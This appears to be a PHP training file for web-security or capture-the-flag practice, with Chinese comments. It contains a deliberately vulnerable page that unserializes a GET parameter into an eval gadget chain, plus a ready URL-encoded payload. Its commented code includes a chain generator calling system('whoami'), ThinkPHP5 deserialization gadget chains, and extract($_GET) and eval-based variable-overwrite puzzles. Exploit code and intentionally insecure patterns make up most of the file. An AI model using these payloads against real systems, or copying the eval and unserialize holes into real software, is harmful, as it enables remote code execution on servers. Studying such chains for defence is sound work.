<?php

class Tiger{
    public $string;
    protected $var;
    public function __toString(){
        return $this->string;
    }
    public function boss($value){
        @eval($value);    //目标利用点
    }
    public function __invoke(){
        $this->boss($this->var);
    }
}
class Lion{
    public $tail;
    public function __construct(){
    $this->tail = array();
    }
    public function __get($value){
        $function = $this->tail;
        return $function();
    }
}
class Monkey{
    public $head;
    public $hand;
    public function __construct($here="zoo"){
        $this->head = $here;
        echo "welcome to ".$this->head."<br>";
    }
    public function __wakeup(){   //起点
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->head)) {   //触发__toString
            echo "hacker";
            $this->source = "index.php";   //source不赋值便可触发__toString
        }
    }
}
class Elephant{
    public $nose;
    public $nice;
    public function __construct($nice="nice"){
        $this->nice = $nice;
        echo $nice;
    }
    public function __toString(){
        return $this->nice->nose;   //不存在，调用__get
    }
}

if(isset($_GET['zoo'])){
    @unserialize($_GET['zoo']);
}
else{
    $a = new Monkey;
    echo "Hello PHP!";
}

// O%3A6%3A%22Monkey%22%3A1%3A%7Bs%3A4%3A%22head%22%3BO%3A8%3A%22Elephant%22%3A2%3A%7Bs%3A4%3A%22nose%22%3BN%3Bs%3A4%3A%22nice%22%3BO%3A4%3A%22Lion%22%3A1%3A%7Bs%3A4%3A%22tail%22%3BO%3A5%3A%22Tiger%22%3A2%3A%7Bs%3A6%3A%22string%22%3BN%3Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D%7D%7D
    
// class Tiger{
//     public $string;
//     protected $var = "system('whoami');";
// }
// class Lion{
//     public $tail;
//     function __construct()
//     {
//         $this->tail = new Tiger();
//     }
// }
// class Elephant{
//     public $nose;
//     public $nice;
//     function __construct()
//     {
//         $this->nice = new Lion();
//     }
// }
// class Monkey{
//     public $head;
//     function __construct(){
//         $this->head = new Elephant();
//     }
// }
// $m = new Monkey();
// // echo serialize($m);
// echo urlencode(serialize($m));
    

    
// thinkphp5 =====================================================================================
// namespace think\process\pipes;
// class Pipes {
// }
// class Windows extends Pipes{
//     private $files = ['/opt/lampp/htdocs/webug/uploads/text.php'];
// }
// $w = new Windows();
// echo urlencode(serialize($w));
    

// namespace think;   //Model类所属namespace
// //抽象类不能实例化，只能被继承
// abstract class Model{
//     protected $append = {};   //参考Conversion类的相同定义
//     private $data = [];   //参考Attribute类的相同定义
    
//     function __construct()   //给两个属性赋值
//     {
//         $this->append = ['woniu' => ['a']];   //截止目前append只需要满足不为空，所以任意定义，Conversion 166 行
//         $this->data = ['woniu' => xxxx];   //此处data的定义要绕一些，因为存在多个调用
//     }
// }

// namespace think\model;
// use think\Model;
// class Pivot extends Model{
// }

// namespace think\process\pipes;
// use think\model\Pivot;
// class Pipes {
// }
// class Windows extends Pipes{
//     private $files = [];
//     function __construct(){
//         $this->files = [new Pivot()];
//     }
// }
// $w = new Windows();
// echo urlencode(serialize($w));

    
    
//变量覆盖 ========================================================
// $var = "woniu";
// $$var = "hello";
// $$$var = "www";
// $www = "woniu";
// echo $$var.'<br>';
// echo $woniu.'<br>';
// echo $hello.'<br>';
// echo $$woniu.'<br>';
// echo $$$$woniu;
    
// $auth = false;
// extract($_GET);
// echo $auth;
// echo $name;
    
//题目一：
// $x = $_GET['x'];
// eval("var_dump($$x);");

//题目二
// error_reporting(0);
// $hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a';
// $parsed = parse_url($_SERVER['REQUEST_URI']);
// var_dump($_SERVER['REQUEST_URI']);
// var_dump($parsed);
// if(isset($parsed["query"])){
//     $query = $parsed["query"];
//     $parsed_query = parse_str($query);
//     if($parsed_query != null){
//         $action = $parsed_query['action'];
//     }
//     if($action==="auth"){
//         $key = $_GET["key"];
//         $hashed_input = hash('sha256',$key);
//         if($hashed_input!==$hashed_key){
//             die("no");
//         }
//         echo "Flag: f7119dfdd560f9d1fcbe";
//     }
// }else{
//     show_source(__FILE__);
// }
    
//弱类型对比
// var_dump("admin"==0);
// var_dump("1admin"==1);
// var_dump("admin1"==1);
// var_dump("admin1"==0);
// var_dump("0e123456"=="0e4456789");
